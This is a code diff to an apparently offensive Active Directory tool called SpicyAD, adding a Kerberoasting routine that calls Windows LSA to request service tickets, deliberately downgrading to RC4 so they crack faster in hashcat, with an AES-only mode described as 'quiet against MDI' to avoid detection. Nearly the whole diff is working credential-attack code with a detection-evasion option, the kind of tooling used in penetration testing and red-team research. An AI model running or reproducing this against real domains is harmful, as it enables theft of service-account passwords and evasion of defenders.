@@ -10,6 +10,23 @@ using System.Reflection;
 
 namespace SpicyAD
 {
+    /// <summary>
+    /// Ticket retrieval strategy for Kerberoasting on domain-joined hosts.
+    /// Controls whether we try to downgrade to RC4 (easier to crack).
+    /// </summary>
+    public enum KerberoastEtypeMode
+    {
+        /// Try RC4 (23) via LSA first, fall back to AES/legacy on refusal. Default.
+        Auto,
+        /// Only ask for RC4. Skip SPNs where the account/KDC refuses RC4.
+        Rc4Only,
+        /// Only ask for AES (18 then 17). Never downgrade. Quiet against MDI.
+        AesOnly,
+        /// Skip the LSA downgrade path entirely; use KerberosRequestorSecurityToken
+        /// like the original code (LSA picks whatever the account supports).
+        NoDowngrade
+    }
+
     public static class KerberosHelper
     {
         // Cached TGT for raw Kerberos requests
@@ -18,6 +35,12 @@ namespace SpicyAD
         private static int _cachedSessionKeyEtype = 0;
         private static string _cachedRealm = null;
         private static string _cachedUsername = null;
+
+        /// <summary>
+        /// Controls the etype downgrade strategy for domain-joined Kerberoasting.
+        /// Program.cs sets it from CLI flags (/rc4only, /aes-only, /no-downgrade).
+        /// </summary>
+        public static KerberoastEtypeMode EtypeMode = KerberoastEtypeMode.Auto;
 
         public static byte[] RequestServiceTicket(string spn)
         {
@@ -31,8 +54,8 @@ namespace SpicyAD
                     return RequestServiceTicketRaw(spn);
                 }
 
-                // Use built-in Windows Kerberos (domain-joined)
-                return RequestServiceTicketWindows(spn);
+                // Domain-joined: apply the etype strategy.
+                return RequestServiceTicketStrategy(spn);
             }
             catch (Exception ex)
             {
@@ -44,6 +67,285 @@ namespace SpicyAD
                 return null;
             }
         }
+
+        /// <summary>
+        /// Domain-joined ticket retrieval respecting EtypeMode.
+        /// Auto:         RC4 (LSA) -> AES256/128 (LSA) -> legacy KerberosRequestorSecurityToken
+        /// Rc4Only:      RC4 (LSA), fail otherwise
+        /// AesOnly:      AES256 (LSA) -> AES128 (LSA) -> legacy
+        /// NoDowngrade:  legacy KerberosRequestorSecurityToken only (LSA picks etype)
+        /// </summary>
+        private static byte[] RequestServiceTicketStrategy(string spn)
+        {
+            switch (EtypeMode)
+            {
+                case KerberoastEtypeMode.NoDowngrade:
+                    return RequestServiceTicketWindows(spn);
+
+                case KerberoastEtypeMode.Rc4Only:
+                    return RequestServiceTicketLsa(spn, 23);
+
+                case KerberoastEtypeMode.AesOnly:
+                {
+                    byte[] t = RequestServiceTicketLsa(spn, 18);
+                    if (t != null) return t;
+                    t = RequestServiceTicketLsa(spn, 17);
+                    if (t != null) return t;
+                    return RequestServiceTicketWindows(spn);
+                }
+
+                case KerberoastEtypeMode.Auto:
+                default:
+                {
+                    // Try RC4 downgrade first — huge speedup for hashcat if account allows it
+                    byte[] t = RequestServiceTicketLsa(spn, 23);
+                    if (t != null) return t;
+                    Console.WriteLine("    [*] RC4 refused, trying AES via LSA...");
+                    t = RequestServiceTicketLsa(spn, 18);
+                    if (t != null) return t;
+                    t = RequestServiceTicketLsa(spn, 17);
+                    if (t != null) return t;
+                    Console.WriteLine("    [*] LSA path exhausted, falling back to legacy API...");
+                    return RequestServiceTicketWindows(spn);
+                }
+            }
+        }
+
+        #region LSA-based ticket retrieval (Rubeus /tgtdeleg-style)
+
+        // === P/Invoke to secur32!Lsa* ===
+
+        [DllImport("secur32.dll", SetLastError = true)]
+        private static extern uint LsaConnectUntrusted(out IntPtr LsaHandle);
+
+        [DllImport("secur32.dll", SetLastError = true)]
+        private static extern uint LsaLookupAuthenticationPackage(IntPtr LsaHandle, ref LSA_STRING PackageName, out int AuthenticationPackage);
+
+        [DllImport("secur32.dll", SetLastError = true)]
+        private static extern uint LsaCallAuthenticationPackage(IntPtr LsaHandle, int AuthenticationPackage,
+            IntPtr ProtocolSubmitBuffer, int SubmitBufferLength, out IntPtr ProtocolReturnBuffer,
+            out int ReturnBufferLength, out uint ProtocolStatus);
+
+        [DllImport("secur32.dll")] private static extern uint LsaFreeReturnBuffer(IntPtr Buffer);
+        [DllImport("secur32.dll")] private static extern uint LsaDeregisterLogonProcess(IntPtr LsaHandle);
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct LSA_STRING
+        {
+            public ushort Length;
+            public ushort MaximumLength;
+            public IntPtr Buffer;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct UNICODE_STRING
+        {
+            public ushort Length;
+            public ushort MaximumLength;
+            public IntPtr Buffer;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct LUID
+        {
+            public uint LowPart;
+            public int HighPart;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct SECURITY_HANDLE
+        {
+            public IntPtr LowPart;
+            public IntPtr HighPart;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct KERB_CRYPTO_KEY
+        {
+            public int KeyType;
+            public int Length;
+            public IntPtr Value;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct KERB_RETRIEVE_TKT_REQUEST
+        {
+            public int MessageType;                   // KerbRetrieveEncodedTicketMessage = 8
+            public LUID LogonId;
+            public UNICODE_STRING TargetName;
+            public uint TicketFlags;
+            public uint CacheOptions;
+            public int EncryptionType;                // 0 = KDC picks, 23 = RC4, 18 = AES256, 17 = AES128
+            public SECURITY_HANDLE CredentialsHandle;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct KERB_EXTERNAL_TICKET
+        {
+            public IntPtr ServiceName;
+            public IntPtr TargetName;
+            public IntPtr ClientName;
+            public UNICODE_STRING DomainName;
+            public UNICODE_STRING TargetDomainName;
+            public UNICODE_STRING AltTargetDomainName;
+            public KERB_CRYPTO_KEY SessionKey;
+            public uint TicketFlags;
+            public uint Flags;
+            public long KeyExpirationTime;
+            public long StartTime;
+            public long EndTime;
+            public long RenewUntil;
+            public long TimeSkew;
+            public int EncodedTicketSize;
+            public IntPtr EncodedTicket;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct KERB_RETRIEVE_TKT_RESPONSE
+        {
+            public KERB_EXTERNAL_TICKET Ticket;
+        }
+
+        private const int KerbRetrieveEncodedTicketMessage = 8;
+        private const uint KERB_RETRIEVE_TICKET_DONT_USE_CACHE = 0x1;
+        private const uint KERB_RETRIEVE_TICKET_AS_KERB_CRED = 0x8;
+
+        /// <summary>
+        /// Retrieve a service ticket via LSA (KerbRetrieveEncodedTicketMessage), asking
+        /// for a specific encryption type. This is how Rubeus does /tgtdeleg-style
+        /// downgrade: the KDC returns a ticket encrypted with the requested etype if
+        /// the target account supports it, otherwise fails with STATUS_NOT_SUPPORTED
+        /// (or similar). Returns the raw [APPLICATION 1] Ticket bytes ready to hand
+        /// to ParseTGSForHashcat, or null on any failure.
+        /// </summary>
+        /// <param name="spn">Service Principal Name</param>
+        /// <param name="requestedEtype">23 (RC4), 18 (AES256), 17 (AES128), or 0 (KDC picks)</param>
+        private static byte[] RequestServiceTicketLsa(string spn, int requestedEtype)
+        {
+            IntPtr lsaHandle = IntPtr.Zero;
+            IntPtr requestBuffer = IntPtr.Zero;
+            IntPtr responseBuffer = IntPtr.Zero;
+            IntPtr kerbNamePtr = IntPtr.Zero;
+
+            try
+            {
+                uint status = LsaConnectUntrusted(out lsaHandle);
+                if (status != 0)
+                {
+                    OutputHelper.Verbose($"    [!] LsaConnectUntrusted failed: 0x{status:X8}");
+                    return null;
+                }
+
+                byte[] kerbNameBytes = Encoding.ASCII.GetBytes("Kerberos");
+                kerbNamePtr = Marshal.AllocHGlobal(kerbNameBytes.Length);
+                Marshal.Copy(kerbNameBytes, 0, kerbNamePtr, kerbNameBytes.Length);
+                LSA_STRING kerbName = new LSA_STRING
+                {
+                    Length = (ushort)kerbNameBytes.Length,
+                    MaximumLength = (ushort)kerbNameBytes.Length,
+                    Buffer = kerbNamePtr
+                };
+
+                int authPackage;
+                status = LsaLookupAuthenticationPackage(lsaHandle, ref kerbName, out authPackage);
+                if (status != 0)
+                {
+                    OutputHelper.Verbose($"    [!] LsaLookupAuthenticationPackage failed: 0x{status:X8}");
+                    return null;
+                }
+
+                // Allocate one buffer for KERB_RETRIEVE_TKT_REQUEST + the SPN string
+                int structSize = Marshal.SizeOf(typeof(KERB_RETRIEVE_TKT_REQUEST));
+                byte[] spnBytes = Encoding.Unicode.GetBytes(spn);
+                int totalSize = structSize + spnBytes.Length;
+                requestBuffer = Marshal.AllocHGlobal(totalSize);
+
+                IntPtr spnPtr = new IntPtr(requestBuffer.ToInt64() + structSize);
+                Marshal.Copy(spnBytes, 0, spnPtr, spnBytes.Length);
+
+                KERB_RETRIEVE_TKT_REQUEST request = new KERB_RETRIEVE_TKT_REQUEST
+                {
+                    MessageType = KerbRetrieveEncodedTicketMessage,
+                    LogonId = new LUID(),                              // 0 = current logon session
+                    TargetName = new UNICODE_STRING
+                    {
+                        Length = (ushort)spnBytes.Length,
+                        MaximumLength = (ushort)spnBytes.Length,
+                        Buffer = spnPtr
+                    },
+                    TicketFlags = 0,
+                    CacheOptions = KERB_RETRIEVE_TICKET_DONT_USE_CACHE, // force fresh request; ignore any cached ticket
+                    EncryptionType = requestedEtype,
+                    CredentialsHandle = new SECURITY_HANDLE()
+                };
+                Marshal.StructureToPtr(request, requestBuffer, false);
+
+                int responseSize;
+                uint protocolStatus;
+                status = LsaCallAuthenticationPackage(
+                    lsaHandle, authPackage, requestBuffer, totalSize,
+                    out responseBuffer, out responseSize, out protocolStatus);
+
+                if (status != 0)
+                {
+                    OutputHelper.Verbose($"    [!] LsaCallAuthenticationPackage failed: 0x{status:X8}");
+                    return null;
+                }
+                if (protocolStatus != 0)
+                {
+                    string reason;
+                    switch (protocolStatus)
+                    {
+                        case 0xC00000BB: reason = "STATUS_NOT_SUPPORTED (target/KDC refused this etype)"; break;
+                        case 0xC0000064: reason = "STATUS_NO_SUCH_USER"; break;
+                        case 0xC000018B: reason = "STATUS_NO_TRUST_SAM_ACCOUNT"; break;
+                        case 0xC000018Cu: reason = "STATUS_TRUSTED_DOMAIN_FAILURE"; break;
+                        default: reason = $"protocol status 0x{protocolStatus:X8}"; break;
+                    }
+                    OutputHelper.Verbose($"    [!] LSA rejected etype {requestedEtype}: {reason}");
+                    return null;
+                }
+
+                KERB_RETRIEVE_TKT_RESPONSE resp = (KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(
+                    responseBuffer, typeof(KERB_RETRIEVE_TKT_RESPONSE));
+
+                if (resp.Ticket.EncodedTicketSize == 0 || resp.Ticket.EncodedTicket == IntPtr.Zero)
+                {
+                    OutputHelper.Verbose("    [!] LSA returned empty ticket");
+                    return null;
+                }
+
+                int returnedEtype = resp.Ticket.SessionKey.KeyType;
+                string etypeName;
+                switch (returnedEtype)
+                {
+                    case 23: etypeName = "RC4-HMAC"; break;
+                    case 18: etypeName = "AES256"; break;
+                    case 17: etypeName = "AES128"; break;
+                    default: etypeName = $"etype {returnedEtype}"; break;
+                }
+                string requestTag = requestedEtype == 0 ? "any" : requestedEtype.ToString();
+                Console.WriteLine($"    [+] LSA ticket via etype-request={requestTag}, got {etypeName} ({resp.Ticket.EncodedTicketSize} bytes)");
+
+                byte[] ticket = new byte[resp.Ticket.EncodedTicketSize];
+                Marshal.Copy(resp.Ticket.EncodedTicket, ticket, 0, resp.Ticket.EncodedTicketSize);
+                return ticket;
+            }
+            catch (Exception ex)
+            {
+                OutputHelper.Verbose($"    [!] LSA path exception: {ex.Message}");
+                return null;
+            }
+            finally
+            {
+                if (responseBuffer != IntPtr.Zero) LsaFreeReturnBuffer(responseBuffer);
+                if (requestBuffer != IntPtr.Zero) Marshal.FreeHGlobal(requestBuffer);
+                if (kerbNamePtr != IntPtr.Zero) Marshal.FreeHGlobal(kerbNamePtr);
+                if (lsaHandle != IntPtr.Zero) LsaDeregisterLogonProcess(lsaHandle);
+            }
+        }
+
+        #endregion
 
         
         /// Request TGS using Windows built-in Kerberos (for domain-joined machines)
